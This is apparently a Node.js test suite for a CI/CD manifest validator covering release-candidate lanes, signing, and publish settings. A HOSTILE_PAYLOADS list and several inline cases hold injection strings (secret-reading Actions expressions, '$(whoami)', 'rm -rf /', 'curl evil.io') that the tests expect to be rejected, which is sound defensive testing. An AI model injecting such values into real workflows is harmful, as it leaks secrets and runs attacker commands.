import test from "node:test";
import assert from "node:assert/strict";
import { validateManifest } from "./manifest.mjs";

const VALID_MINIMAL = {
  schemaVersion: 1,
  compile: "github-actions-only",
  lanes: ["ci"],
  matrix: { os: ["ubuntu-latest"], node: ["22.13"] },
  packageManager: "pnpm@11.25.0",
  templateVersion: "1.0.0",
};

test("requires GitHub Actions only compilation", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, compile: undefined }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, compile: "local" }).valid, false);
});

test("accepts a minimal valid manifest", () => {
  const { valid, errors } = validateManifest(VALID_MINIMAL);
  assert.equal(valid, true);
  assert.deepEqual(errors, []);
});

test("ownership scan registration is explicit and supports nested package roots", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, ownership: { roots: ["engine", "apps/client"] } }).valid, true);
  for (const roots of [[], ["../outside"], ["src\\escape"], [""], ["engine", "engine"]]) {
    assert.equal(validateManifest({ ...VALID_MINIMAL, ownership: { roots } }).valid, false, JSON.stringify(roots));
  }
});

test("rust-hybrid supports ci plus a configured unsigned release-candidate lane", () => {
  const valid = { ...VALID_MINIMAL, profile: "rust-hybrid", gate: { path: "scripts/gate.sh" } };
  assert.equal(validateManifest(valid).valid, true);
  for (const path of ["/tmp/gate.sh", "../gate.sh", "scripts/gate sh", "${{ secrets.X }}", "scripts/gate;sh"]) {
    assert.equal(validateManifest({ ...valid, gate: { path } }).valid, false, path);
  }
  assert.equal(validateManifest({ ...valid, lanes: ["ci", "qualification"] }).valid, false);
  const candidate = {
    ...valid,
    lanes: ["ci", "release-candidate"],
    candidate: {
      buildScript: "ci:candidate",
      checkScript: "ci:candidate-check",
      admissionScript: "release:admit",
      stageSummaryScript: "release:stage-summary",
      artifactRoot: "legion-unsigned",
      os: ["ubuntu-latest"],
    },
  };
  assert.equal(validateManifest(candidate).valid, true);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, signWindows: true } }).valid, false);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, signMacos: true } }).valid, false);
  const windowsCandidate = { ...candidate, matrix: { ...candidate.matrix, os: ["ubuntu-latest", "windows-2025"] }, candidate: { ...candidate.candidate, os: ["windows-2025"], signWindows: true } };
  assert.equal(validateManifest(windowsCandidate).valid, true);
  assert.equal(validateManifest({ ...windowsCandidate, candidate: { ...windowsCandidate.candidate, signWindows: "yes" } }).valid, false);
  const macCandidate = { ...candidate, matrix: { ...candidate.matrix, os: ["ubuntu-latest", "macos-15"] }, candidate: { ...candidate.candidate, os: ["macos-15"], signMacos: true } };
  assert.equal(validateManifest(macCandidate).valid, true);
  assert.equal(validateManifest({ ...macCandidate, candidate: { ...macCandidate.candidate, signMacos: "yes" } }).valid, false);
  assert.equal(validateManifest({ ...macCandidate, matrix: { ...macCandidate.matrix, node: ["22", "24"] } }).valid, false);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, buildScript: "echo unsafe" } }).valid, false);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, artifactRoot: "../escape" } }).valid, false);
  assert.equal(validateManifest({ ...candidate, candidate: { ...candidate.candidate, os: ["windows-latest"] } }).valid, false);

  const releaseChain = {
    ...windowsCandidate,
    candidate: {
      ...windowsCandidate.candidate,
      releaseChain: {
        evidenceVerificationScript: "release:verify-evidence",
        windowsFinalizeScript: "release:finalize:win",
        installedQualificationScript: "release:qualify:installed",
        publishScript: "release:publish:qualified",
        qualificationRunnerVariable: "QUALIFICATION_RUNNER_LABEL",
        publishSecrets: ["CLOUDFLARE_API_TOKEN"],
      },
    },
  };
  assert.equal(validateManifest(releaseChain).valid, true);
  assert.equal(validateManifest({ ...releaseChain, candidate: { ...releaseChain.candidate, signWindows: false } }).valid, false);
  assert.equal(validateManifest({ ...releaseChain, candidate: { ...releaseChain.candidate, releaseChain: { ...releaseChain.candidate.releaseChain, publishScript: "echo unsafe" } } }).valid, false);
  assert.equal(validateManifest({ ...releaseChain, candidate: { ...releaseChain.candidate, releaseChain: { ...releaseChain.candidate.releaseChain, qualificationRunnerVariable: "${{ secrets.X }}" } } }).valid, false);
  assert.equal(validateManifest({ ...releaseChain, candidate: { ...releaseChain.candidate, releaseChain: { ...releaseChain.candidate.releaseChain, publishSecrets: ["TOKEN", "TOKEN"] } } }).valid, false);
});

// Part B fix: admissionScript & stageSummaryScript were moved OUT of the
// optional candidate.releaseChain object and onto candidate directly,
// because the admission job and the candidate job's stage-summary
// init/finalize steps are unconditional parts of the rendered
// release-candidate template — present for every release-candidate lane,
// signed or not. This test proves each is independently required with a
// specific, actionable error, and that the full releaseChain contract
// (now minus those two promoted fields) is validated key-by-key.
test("rust-hybrid release-candidate requires admissionScript & stageSummaryScript independent of signing", () => {
  const base = {
    ...VALID_MINIMAL,
    profile: "rust-hybrid",
    gate: { path: "scripts/gate.sh" },
    lanes: ["ci", "release-candidate"],
    candidate: {
      buildScript: "ci:candidate",
      checkScript: "ci:candidate-check",
      admissionScript: "release:admit",
      stageSummaryScript: "release:stage-summary",
      artifactRoot: "widgets-unsigned",
      os: ["ubuntu-latest"],
    },
  };
  assert.equal(validateManifest(base).valid, true, JSON.stringify(validateManifest(base).errors));

  const { admissionScript, ...withoutAdmission } = base.candidate;
  const missingAdmission = validateManifest({ ...base, candidate: withoutAdmission });
  assert.equal(missingAdmission.valid, false);
  assert.ok(missingAdmission.errors.includes("candidate.admissionScript must be one safe package script name"));

  const { stageSummaryScript, ...withoutStageSummary } = base.candidate;
  const missingStageSummary = validateManifest({ ...base, candidate: withoutStageSummary });
  assert.equal(missingStageSummary.valid, false);
  assert.ok(missingStageSummary.errors.includes("candidate.stageSummaryScript must be one safe package script name"));

  // Neither field is accepted inside releaseChain any more.
  const windows = {
    ...base,
    matrix: { ...base.matrix, os: ["ubuntu-latest", "windows-2025"] },
    candidate: { ...base.candidate, os: ["windows-2025"], signWindows: true },
  };
  const misplaced = validateManifest({
    ...windows,
    candidate: {
      ...windows.candidate,
      releaseChain: {
        admissionScript: "release:admit",
        evidenceVerificationScript: "release:verify-evidence",
        windowsFinalizeScript: "release:finalize:win",
        installedQualificationScript: "release:qualify:installed",
        publishScript: "release:publish:qualified",
        qualificationRunnerVariable: "QUALIFICATION_RUNNER_LABEL",
      },
    },
  });
  assert.equal(misplaced.valid, false);
  assert.ok(misplaced.errors.includes("unknown candidate.releaseChain field: admissionScript"));
});

// Part B fix: evidenceVerificationScript is the one new script that DOES
// stay inside releaseChain (it runs in the `publish` job, verifying
// aggregated same-run evidence before the publish step) — required
// whenever releaseChain is configured, with its own specific error.
test("candidate.releaseChain requires evidenceVerificationScript with a specific error", () => {
  const windows = {
    ...VALID_MINIMAL,
    profile: "rust-hybrid",
    gate: { path: "scripts/gate.sh" },
    lanes: ["ci", "release-candidate"],
    matrix: { ...VALID_MINIMAL.matrix, os: ["ubuntu-latest", "windows-2025"] },
    candidate: {
      buildScript: "ci:candidate",
      checkScript: "ci:candidate-check",
      admissionScript: "release:admit",
      stageSummaryScript: "release:stage-summary",
      artifactRoot: "widgets-unsigned",
      os: ["windows-2025"],
      signWindows: true,
      releaseChain: {
        windowsFinalizeScript: "release:finalize:win",
        installedQualificationScript: "release:qualify:installed",
        publishScript: "release:publish:qualified",
        qualificationRunnerVariable: "QUALIFICATION_RUNNER_LABEL",
      },
    },
  };
  const result = validateManifest(windows);
  assert.equal(result.valid, false);
  assert.ok(result.errors.includes("candidate.releaseChain.evidenceVerificationScript must be one safe package script name"));

  const fixed = {
    ...windows,
    candidate: { ...windows.candidate, releaseChain: { ...windows.candidate.releaseChain, evidenceVerificationScript: "release:verify-evidence" } },
  };
  assert.equal(validateManifest(fixed).valid, true, JSON.stringify(validateManifest(fixed).errors));
});

test("candidate targets permit native multi-architecture matrices independent of normal CI runners", () => {
  const multiArchitecture = {
    ...VALID_MINIMAL,
    profile: "rust-hybrid",
    gate: { path: "scripts/gate.sh" },
    lanes: ["ci", "release-candidate"],
    candidate: {
      buildScript: "ci:candidate",
      checkScript: "ci:candidate-check",
      admissionScript: "release:admit",
      stageSummaryScript: "release:stage-summary",
      artifactRoot: "widgets-unsigned",
      os: ["windows-2025", "windows-11-arm", "macos-15", "macos-15-intel"],
      targets: [
        { os: "windows-2025", platform: "windows", architecture: "x86_64" },
        { os: "windows-11-arm", platform: "windows", architecture: "arm64" },
        { os: "macos-15", platform: "macos", architecture: "arm64" },
        { os: "macos-15-intel", platform: "macos", architecture: "x86_64" },
      ],
      signWindows: true,
      signMacos: true,
    },
  };
  assert.equal(validateManifest(multiArchitecture).valid, true, JSON.stringify(validateManifest(multiArchitecture).errors));
  assert.equal(validateManifest({ ...multiArchitecture, candidate: { ...multiArchitecture.candidate, targets: [{ os: "windows-2025", platform: "windows", architecture: "riscv64" }] } }).valid, false);
  assert.equal(validateManifest({ ...multiArchitecture, candidate: { ...multiArchitecture.candidate, targets: [{ os: "windows-11-arm", platform: "windows", architecture: "x86_64" }] } }).valid, false);
  assert.equal(validateManifest({ ...multiArchitecture, candidate: { ...multiArchitecture.candidate, targets: [{ os: "ubuntu-24.04", platform: "windows", architecture: "x86_64" }] } }).valid, false);
  const xcodeRunner = { ...multiArchitecture, candidate: { ...multiArchitecture.candidate, os: ["xcode-27"], targets: [{ os: "xcode-27", platform: "macos", architecture: "arm64" }], signWindows: false } };
  assert.equal(validateManifest(xcodeRunner).valid, true, JSON.stringify(validateManifest(xcodeRunner).errors));
  assert.equal(validateManifest({ ...multiArchitecture, candidate: { ...multiArchitecture.candidate, os: ["ubuntu-24.04"], targets: [{ os: "ubuntu-24.04", platform: "macos", architecture: "arm64" }] } }).valid, false);
  assert.equal(validateManifest({ ...multiArchitecture, candidate: { ...multiArchitecture.candidate, targets: [{ os: "${{ secrets.X }}", platform: "windows", architecture: "x86_64" }] } }).valid, false);
  assert.equal(validateManifest({ ...multiArchitecture, candidate: { ...multiArchitecture.candidate, releaseChain: { windowsFinalizeScript: "release:finalize:win", macosFinalizeScript: "release:finalize:mac", installedQualificationScript: "release:qualify", publishScript: "release:publish", qualificationRunnerVariable: "QUALIFICATION_RUNNER_LABEL" } } }).valid, false);
});

test("rejects non-object input", () => {
  for (const bad of [null, undefined, "not an object", 42, ["array"]]) {
    const { valid, errors } = validateManifest(bad);
    assert.equal(valid, false);
    assert.ok(errors.length > 0);
  }
});

test("rejects an unknown top-level field", () => {
  const { valid, errors } = validateManifest({ ...VALID_MINIMAL, extra: true });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes("unknown top-level field: extra")));
});

test("rejects schemaVersion other than 1", () => {
  const { valid, errors } = validateManifest({ ...VALID_MINIMAL, schemaVersion: 2 });
  assert.equal(valid, false);
  assert.ok(errors.some((e) => e.includes("schemaVersion")));
});

test("rejects an empty or unknown lane list", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, lanes: [] }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, lanes: ["not-a-real-lane"] }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, lanes: ["ci", "ci"] }).valid, false);
});

test("rejects a malformed matrix", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, matrix: { os: [] , node: ["22.13"] } }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, matrix: { os: ["ubuntu-latest"] } }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, matrix: "ubuntu-latest" }).valid, false);
});

test("rejects a malformed packageManager or templateVersion", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, packageManager: "pnpm" }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, packageManager: "bun@1.0.0" }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, templateVersion: "v1" }).valid, false);
});

test("publish-npm lane requires publish.npm with oidc true", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, lanes: ["publish-npm"] }).valid, false);
  assert.equal(
    validateManifest({ ...VALID_MINIMAL, lanes: ["publish-npm"], publish: { npm: { oidc: false, provenance: true } } }).valid,
    false,
  );
  assert.equal(
    validateManifest({ ...VALID_MINIMAL, lanes: ["publish-npm"], publish: { npm: { oidc: true, provenance: true } } }).valid,
    true,
  );
});

test("publish-package-managers lane requires both homebrew and winget config", () => {
  const base = { ...VALID_MINIMAL, lanes: ["publish-package-managers"] };
  assert.equal(validateManifest(base).valid, false);
  assert.equal(
    validateManifest({ ...base, publish: { homebrew: { tap: "acme/tap", formulaName: "widgets" } } }).valid,
    false,
  );
  assert.equal(
    validateManifest({
      ...base,
      publish: {
        homebrew: { tap: "acme/tap", formulaName: "widgets" },
        winget: { packageIdentifier: "Acme.Widgets" },
      },
    }).valid,
    true,
  );
});

test("rejects a malformed homebrew tap (must be owner/repo)", () => {
  const result = validateManifest({
    ...VALID_MINIMAL,
    lanes: ["publish-package-managers"],
    publish: {
      homebrew: { tap: "not-owner-slash-repo", formulaName: "widgets" },
      winget: { packageIdentifier: "Acme.Widgets" },
    },
  });
  assert.equal(result.valid, false);
});

// F15 fix: manifest fields (homebrew.tap, homebrew.formulaName,
// winget.packageIdentifier, matrix.os/node) flow verbatim into rendered
// workflow YAML via render.mjs's literal string substitution, which does no
// escaping. The re-validation proved a hostile `formulaName` containing
// GitHub Actions expression syntax survived into rendered output — a
// workflow-expression injection, not a cosmetic bug. Every property below
// is checked against a FAMILY of hostile payloads (expression syntax,
// command substitution, backticks, statement separators, newlines/CRLF —
// not just the report's one literal example — because a fix that only
// blocks that exact string would be exactly the failure this suite must
// catch. Each field must reject every payload in the family.
const HOSTILE_PAYLOADS = [
  "${{ secrets.APPLE_CERTIFICATE }}",
  "widgets${{secrets.X}}",
  "`whoami`",
  "$(whoami)",
  "widgets; rm -rf /",
  "widgets\nsteps:\n  - run: exit 1",
  "widgets\r\nrun: curl evil.io",
  'widgets"; secrets: ${{ secrets.X }}',
  "widgets & echo pwned",
  "widgets|echo pwned",
];

test("F15: publish.homebrew.formulaName rejects a family of injection payloads", () => {
  for (const payload of HOSTILE_PAYLOADS) {
    const result = validateManifest({
      ...VALID_MINIMAL,
      lanes: ["publish-package-managers"],
      publish: {
        homebrew: { tap: "acme/tap", formulaName: payload },
        winget: { packageIdentifier: "Acme.Widgets" },
      },
    });
    assert.equal(result.valid, false, `formulaName payload should be rejected: ${JSON.stringify(payload)}`);
  }
});

test("F15: publish.homebrew.tap rejects a family of injection payloads", () => {
  for (const payload of HOSTILE_PAYLOADS) {
    const result = validateManifest({
      ...VALID_MINIMAL,
      lanes: ["publish-package-managers"],
      publish: {
        homebrew: { tap: `acme/${payload}`, formulaName: "widgets" },
        winget: { packageIdentifier: "Acme.Widgets" },
      },
    });
    assert.equal(result.valid, false, `tap payload should be rejected: ${JSON.stringify(payload)}`);
  }
});

test("F15: publish.winget.packageIdentifier rejects a family of injection payloads", () => {
  for (const payload of HOSTILE_PAYLOADS) {
    const result = validateManifest({
      ...VALID_MINIMAL,
      lanes: ["publish-package-managers"],
      publish: {
        homebrew: { tap: "acme/tap", formulaName: "widgets" },
        winget: { packageIdentifier: payload },
      },
    });
    assert.equal(result.valid, false, `winget packageIdentifier payload should be rejected: ${JSON.stringify(payload)}`);
  }
});

test("F15: matrix.os and matrix.node reject a family of injection payloads", () => {
  for (const payload of HOSTILE_PAYLOADS) {
    assert.equal(
      validateManifest({ ...VALID_MINIMAL, matrix: { os: [payload], node: ["22.13"] } }).valid,
      false,
      `matrix.os payload should be rejected: ${JSON.stringify(payload)}`,
    );
    assert.equal(
      validateManifest({ ...VALID_MINIMAL, matrix: { os: ["ubuntu-latest"], node: [payload] } }).valid,
      false,
      `matrix.node payload should be rejected: ${JSON.stringify(payload)}`,
    );
  }
});

// Non-regression: realistic, legitimate values using the characters real
// GitHub/Homebrew/WinGet identifiers and runner/version labels actually use
// must keep passing — the allowlist must not be so strict it breaks normal
// configuration.
test("F15 non-regression: realistic homebrew/winget/matrix values still validate", () => {
  const result = validateManifest({
    ...VALID_MINIMAL,
    lanes: ["publish-package-managers"],
    matrix: { os: ["ubuntu-latest", "self-hosted-linux"], node: ["22.13", "lts/*", "20.x"] },
    publish: {
      homebrew: { tap: "acme-inc/homebrew-tap", formulaName: "widgets++" },
      winget: { packageIdentifier: "Acme.Widgets.Beta" },
    },
  });
  assert.equal(result.valid, true, JSON.stringify(result.errors));
});

test("qaEvidencePath and qaEvidenceRetentionDays are optional, rust-hybrid only, and charset-checked", () => {
  const valid = { ...VALID_MINIMAL, profile: "rust-hybrid", gate: { path: "scripts/gate.sh" } };
  assert.equal(validateManifest({ ...valid, qaEvidencePath: "pulse-hub-qa" }).valid, true);
  assert.equal(validateManifest({ ...valid, qaEvidencePath: "pulse-hub-qa", qaEvidenceRetentionDays: 30 }).valid, true);
  for (const qaEvidencePath of ["/abs", "../up", "pulse hub", "${{ runner.temp }}/x", "a;b", "", null]) {
    assert.equal(validateManifest({ ...valid, qaEvidencePath }).valid, false, String(qaEvidencePath));
  }
  for (const qaEvidenceRetentionDays of [0, 91, 1.5, "7"]) {
    assert.equal(validateManifest({ ...valid, qaEvidencePath: "pulse-hub-qa", qaEvidenceRetentionDays }).valid, false, String(qaEvidenceRetentionDays));
  }
  assert.equal(validateManifest({ ...valid, qaEvidenceRetentionDays: 7 }).valid, false, "retention requires a path");
  assert.equal(validateManifest({ ...VALID_MINIMAL, qaEvidencePath: "pulse-hub-qa" }).valid, false, "node profile rejects qaEvidencePath");
});

test("ciAllOs is an optional boolean, rust-hybrid only", () => {
  const valid = { ...VALID_MINIMAL, profile: "rust-hybrid", gate: { path: "scripts/gate.sh" } };
  assert.equal(validateManifest(valid).valid, true);
  assert.equal(validateManifest({ ...valid, ciAllOs: true }).valid, true);
  assert.equal(validateManifest({ ...valid, ciAllOs: false }).valid, true);
  for (const ciAllOs of ["true", 1, null]) {
    assert.equal(validateManifest({ ...valid, ciAllOs }).valid, false, String(ciAllOs));
  }
  assert.equal(validateManifest({ ...VALID_MINIMAL, ciAllOs: true }).valid, false, "node profile rejects ciAllOs true");
  assert.equal(validateManifest({ ...VALID_MINIMAL, ciAllOs: false }).valid, true, "false is accepted for any profile");
});

test("ciIncremental is an optional boolean, rust-hybrid only", () => {
  const valid = { ...VALID_MINIMAL, profile: "rust-hybrid", lanes: ["ci"], gate: { path: "scripts/gate.sh" } };
  assert.equal(validateManifest({ ...valid, ciIncremental: true }).valid, true);
  assert.equal(validateManifest({ ...valid, ciIncremental: false }).valid, true);
  assert.equal(validateManifest({ ...valid, ciIncremental: "yes" }).valid, false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, ciIncremental: true }).valid, false);
});

test("devArtifact validates keys, paths, and runner coverage", () => {
  const base = {
    ...VALID_MINIMAL,
    profile: "rust-hybrid",
    lanes: ["ci"],
    gate: { path: "scripts/gate.sh" },
    matrix: { os: ["xcode-27", "windows-2025"], node: ["26.8.1"] },
    ciAllOs: true,
  };
  const full = { mac: "sign", windows: "unsigned", macAppPath: "target/release/bundle/macos/Pulse.app", windowsGlob: "target/release/*.exe", retentionDays: 7 };
  assert.equal(validateManifest({ ...base, devArtifact: full }).valid, true);
  assert.equal(validateManifest({ ...base, devArtifact: { windows: "unsigned", windowsGlob: "dist/*.exe" } }).valid, true);

  const bad = (devArtifact, manifest = base) => validateManifest({ ...manifest, devArtifact }).valid;
  assert.equal(bad({ mac: "none", windows: "none" }), false, "needs at least one active target");
  assert.equal(bad({ ...full, macAppPath: undefined }), false, "mac sign needs macAppPath");
  assert.equal(bad({ ...full, windowsGlob: undefined }), false, "windows needs windowsGlob");
  assert.equal(bad({ ...full, macAppPath: "../Pulse.app" }), false);
  assert.equal(bad({ ...full, macAppPath: "target/Pulse" }), false, "must end in .app");
  assert.equal(bad({ ...full, macAppPath: "a;b.app" }), false);
  assert.equal(bad({ ...full, windowsGlob: "${{ x }}" }), false);
  assert.equal(bad({ ...full, retentionDays: 0 }), false);
  assert.equal(bad({ ...full, retentionDays: 91 }), false);
  assert.equal(bad({ ...full, mac: "staple" }), false);
  assert.equal(validateManifest({ ...base, devArtifact: { ...full, mac: "notarize" } }).valid, true, "notarize is a signed mac mode");
  assert.equal(bad({ ...full, extra: 1 }), false);
  assert.equal(bad({ windows: "unsigned", windowsGlob: "a/*.exe", macAppPath: "x.app" }), false, "macAppPath requires mac sign");
  assert.equal(bad(full, { ...base, ciAllOs: false }), false, "single windows runner cannot build the mac app");
  assert.equal(bad(full, { ...VALID_MINIMAL, devArtifact: full }), false);
  assert.equal(validateManifest({ ...VALID_MINIMAL, devArtifact: full }).valid, false, "node profile rejects devArtifact");

  // mac 'unsigned' uploads the bare app; dispatch is allowed only for unsigned legs.
  const unsigned = { ...full, mac: "unsigned" };
  assert.equal(validateManifest({ ...base, devArtifact: unsigned }).valid, true);
  assert.equal(validateManifest({ ...base, devArtifact: { ...unsigned, dispatch: true } }).valid, true);
  assert.equal(validateManifest({ ...base, devArtifact: { mac: "unsigned", macAppPath: "target/Pulse.app" } }).valid, true, "mac unsigned alone");
  assert.equal(bad({ ...unsigned, macAppPath: undefined }), false, "mac unsigned needs macAppPath");
  assert.equal(bad({ ...unsigned, macEntitlements: "build/x.entitlements" }), false, "entitlements require mac sign");
  assert.equal(bad(unsigned, { ...base, ciAllOs: false }), false, "mac unsigned needs a macOS runner");
  assert.equal(bad({ ...full, dispatch: false }), false, "dispatch must be true when present");
  assert.equal(bad({ mac: "sign", macAppPath: "target/Pulse.app", dispatch: true }), false, "dispatch never reaches the signing leg");
  assert.equal(validateManifest({ ...base, devArtifact: { ...full, dispatch: true } }).valid, true, "dispatch with a windows unsigned leg beside mac sign");
});

test("checkout is an optional object with boolean longPaths and safe sparse directories", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, checkout: { longPaths: true, sparse: ["packages/", "examples/SliceApp"] } }).valid, true);
  assert.equal(validateManifest({ ...VALID_MINIMAL, checkout: {} }).valid, true);
  for (const checkout of [null, [], "x", { longPaths: "yes" }, { sparse: [] }, { sparse: ["../x"] }, { sparse: ["/abs"] }, { sparse: ["a b"] }, { sparse: ["${{ x }}"] }, { sparse: ["a", "a"] }, { other: 1 }]) {
    assert.equal(validateManifest({ ...VALID_MINIMAL, checkout }).valid, false, JSON.stringify(checkout));
  }
});

test("defaultBranch is an optional safe branch name", () => {
  assert.equal(validateManifest({ ...VALID_MINIMAL, defaultBranch: "master" }).valid, true);
  for (const defaultBranch of ["", "a/b", "a b", "..x", "${{ x }}", 1, null]) {
    assert.equal(validateManifest({ ...VALID_MINIMAL, defaultBranch }).valid, false, String(defaultBranch));
  }
});

// Orthic-Labs/rightkit#107: candidate.devQualification and the QA-surface guard.
const DEV_QUAL_BASE = {
  ...VALID_MINIMAL,
  profile: "rust-hybrid",
  gate: { path: "scripts/gate.sh" },
  lanes: ["ci", "release-candidate"],
  candidate: {
    buildScript: "ci:candidate",
    checkScript: "ci:candidate-check",
    admissionScript: "release:admit",
    stageSummaryScript: "release:stage-summary",
    artifactRoot: "widgets-unsigned",
    os: ["ubuntu-latest"],
  },
};

test("candidate.devQualification validates build and journey scripts", () => {
  const withDev = (devQualification) => ({ ...DEV_QUAL_BASE, candidate: { ...DEV_QUAL_BASE.candidate, devQualification } });
  const ok = validateManifest(withDev({ buildScript: "build:dev-qualification", journeyScript: "qa:journeys" }));
  assert.equal(ok.valid, true, JSON.stringify(ok.errors));
  for (const bad of [
    null,
    [],
    {},
    { buildScript: "build:dev" },
    { journeyScript: "qa:journeys" },
    { buildScript: "echo unsafe", journeyScript: "qa:journeys" },
    { buildScript: "build:dev", journeyScript: "qa journeys" },
    { buildScript: "build:dev", journeyScript: "qa:journeys", extra: "x" },
  ]) {
    assert.equal(validateManifest(withDev(bad)).valid, false, JSON.stringify(bad));
  }
  const same = validateManifest(withDev({ buildScript: "ci:candidate", journeyScript: "qa:journeys" }));
  assert.equal(same.valid, false);
  assert.ok(same.errors.some((error) => error.includes("must differ from candidate.buildScript") && error.includes("#107")));
});

test("candidate scripts named after a QA surface are refused and point at dev-qualification", () => {
  for (const name of ["build:qa-native", "ci:qa-control", "build:dev-native", "build:dev-inspect", "ci:test-mode"]) {
    for (const key of ["buildScript", "checkScript"]) {
      const result = validateManifest({ ...DEV_QUAL_BASE, candidate: { ...DEV_QUAL_BASE.candidate, [key]: name } });
      assert.equal(result.valid, false, `${key}=${name}`);
      assert.ok(result.errors.some((error) => error.includes(`candidate.${key}`) && error.includes("#107") && error.includes("devQualification")), `${key}=${name}`);
    }
  }
  assert.equal(validateManifest(DEV_QUAL_BASE).valid, true);
});
